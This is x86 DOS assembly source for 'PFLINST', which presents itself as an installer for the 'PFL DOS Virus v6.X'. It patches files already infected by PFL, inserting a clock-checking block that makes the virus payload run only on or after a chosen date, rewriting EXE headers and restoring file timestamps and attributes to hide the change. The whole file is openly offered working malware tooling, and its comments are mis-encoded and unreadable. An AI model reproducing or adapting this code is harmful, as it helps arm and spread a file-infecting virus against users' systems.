.386c
seg_a   segment  byte public use16
        assume   cs:seg_a, ds:seg_a
        org      100h
pflinst proc     far
start:
        mov      di,offset buffer_for_UPA
        call     upa
        mov      si,offset buffer_for_UPA
        mov      cx,1
        call     param
        jc       display_logo_exit
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
        mov      si,offset buffer_for_UPA
        mov      cx,2
        call     param
        jc       error_atleast_5_param
        ;귣若�: BX - 丞젳猶젰� 췅 ㄵ�� ‘А�
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      number_dd
        mov      al,[si]
        cmp      al,'*'
        jnz      dd_bad_param
        jmp      move_day
number_dd:
        cmp      cl,2
        jnz      dd_bad_param
        mov      ax,word ptr ds:[si]
        call     reform_ax_to_normal_number
        jc       dd_bad_param
        ;귣若�: AL - ㄵ�� ぎァ졹え
        or       al,al
        jz       dd_bad_param
        cmp      al,31h
        ja       dd_bad_param
move_day:
        mov      ds:[dd_],al
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
        mov      si,offset buffer_for_UPA
        mov      cx,3
        call     param
        jc       error_atleast_5_param
        ;귣若�: BX - 丞젳猶젰� 췅 ㄵ�� ‘А�
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      number_mm
        mov      al,[si]
        cmp      al,'*'
        jnz      mm_bad_param
        jmp      move_month
number_mm:
        cmp      cl,2
        jnz      mm_bad_param
        mov      ax,word ptr ds:[si]
        call     reform_ax_to_normal_number
        jc       mm_bad_param
        ;귣若�: AL - Д碎� ぎァ졹え
        or       al,al
        jz       mm_bad_param
        cmp      al,12h
        ja       mm_bad_param
move_month:
        mov      ds:[mm_],al
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
        mov      si,offset buffer_for_UPA
        mov      cx,4
        call     param
        jc       error_atleast_5_param
        ;귣若�: BX - 丞젳猶젰� 췅 ㄵ�� ‘А�
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      number_yy
        mov      al,[si]
        cmp      al,'*'
        jnz      yy_bad_param
        jmp      move_year
number_yy:
        cmp      cl,2
        jnz      yy_bad_param
        mov      ax,word ptr ds:[si]
        call     reform_ax_to_normal_number
        jc       yy_bad_param
        ;귣若�: AL - ．� ぎァ졹え
move_year:
        mov      ds:[yy_],al
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
        mov      si,offset buffer_for_UPA
        mov      cx,5
        call     param
        jc       error_atleast_5_param
        mov      si,bx
        call     size_0
        cmp      cl,1
        jnz      type_bad_param
        mov      al,ds:[si]
        cmp      al,31h
        jz       good_type_param
        cmp      al,32h
        jnz      type_bad_param
good_type_param:
        mov      type_,al
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
        ;룼첓㏓쥯�� ㏇� 譽� щ 칛� �ⓨ ㎛젰�
        mov      dx,offset text_for_type1
        cmp      type_,31h
        jz       type1
        mov      dx,offset text_for_type2
type1:
        call     write_t
        ;뮙�쩺� ㄵ��
        mov      dx,offset any_day_text
        cmp      dd_,'*'
        jz       star_dd
        mov      ah,dd_
        mov      si,offset(_day_text+8)
        call     reform_to_BCD
        mov      dx,offset _day_text
star_dd:
        call     write_t
        ;뮙�쩺� Д碎�
        mov      dx,offset any_month_text
        cmp      mm_,'*'
        jz       star_mm
        mov      al,mm_
        ;귛��: AL - Д碎�
        call     select_month
        ;귣若�: BX - pointer to month (ㄻÞ췅 9 줎⒱)
        mov      cx,09h
        mov      si,bx
        mov      di,offset (_month_text+8)
        rep      movsb ;DS:[SI] -> ES:[DI]
        mov      dx,offset _month_text
star_mm:
        call     write_t
        ;뮙�쩺� ．�
        mov      dx,offset any_year_text
        cmp      yy_,'*'
        jz       star_yy
        mov      ah,yy_
        mov      si,offset(_year_text+8)
        call     reform_to_BCD
        mov      dx,offset _year_text
star_yy:
        call     write_t
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
        ;겈p�� 졻pÆ呻� �젵쳽
        mov      si,offset buffer_for_UPA
        mov      cx,1
        call     param
        mov      dx,bx
        mov      ax,4300h
        int      21h
        jc       error_openfile
        ;귣若�:  CX - 졻pÆ呻
        mov      word ptr ds:[attribute_of_file],cx
        mov      ax,4301h
        xor      cx,cx
        int      21h
        jc       error_openfile
        ;롡챥淫� �젵� ㄻ� 譽��⑨/쭬�ⓤ�
        mov      ax,3D02h
        int      21h
        jc       error_openfile
        mov      word ptr ds:[place_of_handle+1],ax
        ;겈p�� 꽑栒/굋�э 貰ℓ젺⑨ �젵쳽
        mov      bx,ax
        mov      ax,5700h
        int      21h
        jc       error_openfile
        ;귣若�:  CX - 줽�э
        ;        DX - 쩆��
        mov      word ptr ds:[time_of_file],cx
        mov      word ptr ds:[date_of_file],dx
        ;맆‘�� � �젵ギ�
        call     set_lseek_begin
        mov      cx,20h
        mov      dx,offset file_first_20h_byte
        call     read_file
        call     set_lseek_end
        ;귣若�: DX.AX
        sub      ax,4h
        sbb      dx,0
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,4h
        mov      dx,offset common_buffer
        call     read_file
        cmp      word ptr [common_buffer],2120h
        jz       PFL_infected_file
        mov      dx,offset no_PFL_file_text
        call     write_t
        jmp      close_file_exit_zaraza
PFL_infected_file:
        ;뫊��pº 殊� �젵쳽
        mov      dx,offset file_COM
        cmp      word ptr [file_first_20h_byte],'ZM'
        jnz      process_for_COM_file
        mov      dx,offset file_EXE
        call     write_t
        jmp      process_for_EXE_file
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
process_for_COM_file:
        call     write_t
        mov      ax,word ptr ds:[file_first_20h_byte+1]
        add      ax,3h
        ;AX - 丞젳졻�レ 췅 ˘p信
        mov      [pointer_to_virus],ax
        xor      cx,cx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,5000h
        mov      dx,offset common_buffer
        call     read_file
        mov      [virus_length],ax
        xor      cx,cx
        mov      dx,[pointer_to_virus]
        call     set_lseek_begin_pluscxdx
        cmp      [type_],31h
        jnz      type2_process_COM
        mov      al,[dd_]
        mov      [dd_in_after_block],al
        mov      al,[mm_]
        mov      [mm_in_after_block],al
        mov      al,[yy_]
        mov      [yy_in_after_block],al
        mov      cx,length_of_after_block
        mov      dx,offset after_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
        jmp      end_processing
type2_process_COM:
        mov      al,[dd_]
        mov      [dd_in_onlyin_block],al
        mov      al,[mm_]
        mov      [mm_in_onlyin_block],al
        mov      al,[yy_]
        mov      [yy_in_onlyin_block],al
        mov      cx,length_of_onlyin_block
        mov      dx,offset onlyin_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
        jmp      end_processing
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;꽡줎˙���� Þ飡�ワ獸p� � EXE �젵ャ
process_for_EXE_file:
        ;맆葉�젰� 獸囹� ℡�쩆 ˘p信�
        ;+14h EXEIP
        ;+16h ReloCS
        ;+08h Header Size
        mov      ax,word ptr ds:[file_first_20h_byte+16h]
        add      ax,word ptr ds:[file_first_20h_byte+08h]
        mov      cx,10h
        mul      cx     ;AX*CX -> DX.AX
        add      ax,word ptr ds:[file_first_20h_byte+14h]
        adc      dx,0
        ;DX.AX - pointer to virus
        mov      [pointer_to_virus],ax
        mov      [pointer_to_virus_2],dx
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,5000h
        mov      dx,offset common_buffer
        call     read_file
        mov      [virus_length],ax
        mov      dx,[pointer_to_virus]
        mov      cx,[pointer_to_virus_2]
        call     set_lseek_begin_pluscxdx
        cmp      [type_],31h
        jnz      type2_process_EXE
        mov      al,[dd_]
        mov      [dd_in_after_block],al
        mov      al,[mm_]
        mov      [mm_in_after_block],al
        mov      al,[yy_]
        mov      [yy_in_after_block],al
        mov      cx,length_of_after_block
        mov      dx,offset after_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
        jmp      correct_EXE_header
type2_process_EXE:
        mov      al,[dd_]
        mov      [dd_in_onlyin_block],al
        mov      al,[mm_]
        mov      [mm_in_onlyin_block],al
        mov      al,[yy_]
        mov      [yy_in_onlyin_block],al
        mov      cx,length_of_onlyin_block
        mov      dx,offset onlyin_block
        call     write_to_file
        mov      cx,[virus_length]
        mov      dx,offset common_buffer
        call     write_to_file
correct_EXE_header:
        call     set_lseek_end ;귣若�: DX:AX - 췅 ぎ�璵
        mov      cx,200h
        div      cx
        or       dx,dx
        jz       size_multiple_200
        inc      ax
size_multiple_200:
        mov      word ptr ds:[file_first_20h_byte+04h],ax
        mov      word ptr ds:[file_first_20h_byte+02h],dx
        call     set_lseek_begin
        mov      cx,20h
        mov      dx,offset file_first_20h_byte
        call     write_to_file
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
end_processing:
        mov      dx,offset ok_text
        call     write_t
        ;묅젪º 飡쟰瑜 쩆栒/줽�э 貰ℓ젺⑨ �젵쳽
        mov      bx,word ptr ds:[place_of_handle+1]
        mov      ax,5701h
        db       0B9h ;MOV CX,XXXXh
time_of_file:
        dw       0
        db       0BAh ;MOV DX,XXXXh
date_of_file:
        dw       0
        int      21h
close_file_exit_zaraza:
        call     close_file
cannot_take_handle:
        ;묅젪º 飡쟰硫 졻pÆ呻 �젵ャ
        mov      ax,4301h
        db       0B9h ;MOV CX,XXXXh
attribute_of_file:
        dw       0
        int      21h
        mov      ax,4C00h
        int      21h
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
after_block:
        pusha
        push     ds es
        call     init_after_block
init_after_block:
        pop      bp
        push     cs
        pop      ds
        mov      ah,04h
        int      1Ah
        ;귣若�: CL - ．� � ぎㄵ   BCD
        ;       DH - Д碎� � ぎㄵ BCD
        ;       DL - ㄵ�� � ぎㄵ  BCD
        ;꺇�
        mov      al,byte ptr ds:[bp+yy_in_after_block-init_after_block]
        cmp      al,'*'
        jz       any_year_in_after
        cmp      cl,al
        jb       virus_after_not_allowed
        ja       virus_after_allowed
any_year_in_after:
        ;뙠碎�
        mov      al,byte ptr ds:[bp+mm_in_after_block-init_after_block]
        cmp      al,'*'
        jz       any_month_in_after
        cmp      dh,al
        jb       virus_after_not_allowed
        ja       virus_after_allowed
any_month_in_after:
        ;뿨笹�
        mov      al,byte ptr ds:[bp+dd_in_after_block-init_after_block]
        cmp      al,'*'
        jz       virus_after_allowed
        cmp      dl,al
        jae      virus_after_allowed
virus_after_not_allowed:
        pop      es ds
        popa
        mov      bx,'DK'
        jmp      virus_native_after
virus_after_allowed:
        pop      es ds
        popa
        jmp      virus_native_after
dd_in_after_block db 0
mm_in_after_block db 0
yy_in_after_block db 0
virus_native_after:
length_of_after_block = $ - after_block
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
onlyin_block:
        pusha
        push     ds es
        call     init_onlyin_block
init_onlyin_block:
        pop      bp
        push     cs
        pop      ds
        mov      ah,04h
        int      1Ah
        ;귣若�: CL - ．� � ぎㄵ   BCD
        ;       DH - Д碎� � ぎㄵ BCD
        ;       DL - ㄵ�� � ぎㄵ  BCD
        ;꺇�
        mov      al,byte ptr ds:[bp+yy_in_onlyin_block-init_onlyin_block]
        cmp      al,'*'
        jz       any_year_in_onlyin
        cmp      cl,al
        jnz      virus_onlyin_not_allowed
any_year_in_onlyin:
        ;뙠碎�
        mov      al,byte ptr ds:[bp+mm_in_onlyin_block-init_onlyin_block]
        cmp      al,'*'
        jz       any_month_in_onlyin
        cmp      dh,al
        jnz      virus_onlyin_not_allowed
any_month_in_onlyin:
        ;뿨笹�
        mov      al,byte ptr ds:[bp+dd_in_onlyin_block-init_onlyin_block]
        cmp      al,'*'
        jz       virus_onlyin_allowed
        cmp      dl,al
        jz       virus_onlyin_allowed
virus_onlyin_not_allowed:
        pop      es ds
        popa
        mov      bx,'DK'
        jmp      virus_native_onlyin
virus_onlyin_allowed:
        pop      es ds
        popa
        jmp      virus_native_onlyin
dd_in_onlyin_block db 0
mm_in_onlyin_block db 0
yy_in_onlyin_block db 0
virus_native_onlyin:
length_of_onlyin_block = $ - onlyin_block
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;H� ℡�ㄵ: AX - 葉笹�
reform_ax_to_normal_number:
        push     ax
        call     check_al_for_valid_number
        jc       exit_stc_reform_ax_to_normal_number
        mov      al,ah
        call     check_al_for_valid_number
        jc       exit_stc_reform_ax_to_normal_number
        pop      ax
        sub      ax,3030h
        shl      al,1
        shl      al,1
        shl      al,1
        shl      al,1
        or       al,ah
        clc
        retn
exit_stc_reform_ax_to_normal_number:
        stc
        pop      ax
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
check_al_for_valid_number:
        cmp      al,30h
        jb       bad_al
        cmp      al,39h
        ja       bad_al
        clc
        retn
bad_al:
        stc
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
write_to_file:
        mov      ah,40h
        jmp      call_int21_with_use_handle
read_file:
        mov      ah,3Fh
        jmp      call_int21_with_use_handle
set_lseek_begin:
        xor      cx,cx
        xor      dx,dx
set_lseek_begin_pluscxdx:
        mov      ax,4200h
        jmp      call_int21_with_use_handle
set_lseek_current:
        xor      cx,cx
        xor      dx,dx
set_lseek_curent_pluscxdx:
        mov      ax,4201h
        jmp      call_int21_with_use_handle
set_lseek_end:
        xor      cx,cx
        xor      dx,dx
set_lseek_end_pluscxdx:
        mov      ax,4202h
        jmp      call_int21_with_use_handle
close_file:
        mov      ah,3eh
call_int21_with_use_handle:
        push     bx
place_of_handle:
        mov      bx,0100h
        int      21h
        pop      bx
        retn
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
dd_bad_param:
        mov      dx,offset dd_bad_param_text
        call     write_t
        jmp      exit_pflinst
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
mm_bad_param:
        mov      dx,offset mm_bad_param_text
        call     write_t
        jmp      exit_pflinst
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
yy_bad_param:
        mov      dx,offset yy_bad_param_text
        call     write_t
        jmp      exit_pflinst
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
type_bad_param:
        mov      dx,offset type_bad_param_text
        call     write_t
        jmp      exit_pflinst
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
error_openfile:
        mov      dx,offset error_openfile_text
        call     write_t
        jmp      exit_pflinst
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
error_atleast_5_param:
        mov      dx,offset error_atleast_5_param_text
        call     write_t
        jmp      exit_pflinst
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
display_logo_exit:
        mov      dx,offset logo
        call     write_t
        mov      dx,offset logo2
        call     write_t
exit_pflinst:
        mov      ax,4C00h
        int      21h
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
include write_t.asm
include upa.asm
include param.asm
include size_0.asm
include rtbcd.asm
include sm.asm
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴 DATA 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
logo    db 0ah,"PFLINST v1.01 � Installator for PFL DOS Virus v6.X",0dh,0ah,'$'
logo2   db 07h,"usage: pflinst.com [path\]<filename> <dd-mm-yy> <1|2>",0dh,0ah
        db     "<filename> - File infected by PFL v6.X or other that have flag INST",0dh,0ah
        db     "<dd-mm-yy> - Day-Month-Year ('*' for any )",0dh,0ah
        db     "<1|2>      - 1. Execute Virus after   Day-Month-Year",0dh,0ah
        db     "             2. Execute Virus only in Day-Month-Year",0dh,0ah,'$'
error_atleast_5_param_text db 07h,'error: At least three paramiter required',0dh,0ah,'$'
error_openfile_text        db 07h,'error: Cannot open input file',0dh,0ah,'$'
dd_bad_param_text          db 07h,'error: DD param is bad',0dh,0ah,'$'
mm_bad_param_text          db 07h,'error: MM param is bad',0dh,0ah,'$'
yy_bad_param_text          db 07h,'error: YY param is bad',0dh,0ah,'$'
type_bad_param_text        db 07h,'error: Type param is bad',0dh,0ah,'$'
no_PFL_file_text           db 07h,'error: This file not infected by PFL v6.1 or other INST modification',0dh,0ah,'$'
ok_text                    db 0ah,'..OK',0dh,0ah,'$'
dd_   db 0
mm_   db 0
yy_   db 0
type_ db 0
text_for_type1 db 0ah,'MODE: Execute Virus after',0dh,0ah,'$'
text_for_type2 db 0ah,'MODE: Execute Virus only in',0dh,0ah,'$'

any_day_text   db 07h,'Day:   Any        ',0dh,0ah,'$'
_day_text      db 07h,'Day:              ',0dh,0ah,'$'
any_month_text db 07h,'Month: Any        ',0dh,0ah,'$'
_month_text    db 07h,'Month:            ',0dh,0ah,'$'
any_year_text  db 07h,'Year:  Any        ',0dh,0ah,'$'
_year_text     db 07h,'Year:             ',0dh,0ah,'$'

file_EXE       db 07h,'FILE TYPE: EXE',0dh,0ah,'$'
file_COM       db 07h,'FILE TYPE: COM',0dh,0ah,'$'
db 'DrW4.00'
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
virus_length        dw ?
pointer_to_virus    dw ?
pointer_to_virus_2  dw ?
buffer_for_UPA      db 80h dup (?)
file_first_20h_byte db 20h dup (?)
common_buffer       db ?
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
pflinst endp
seg_a   ends
end     start
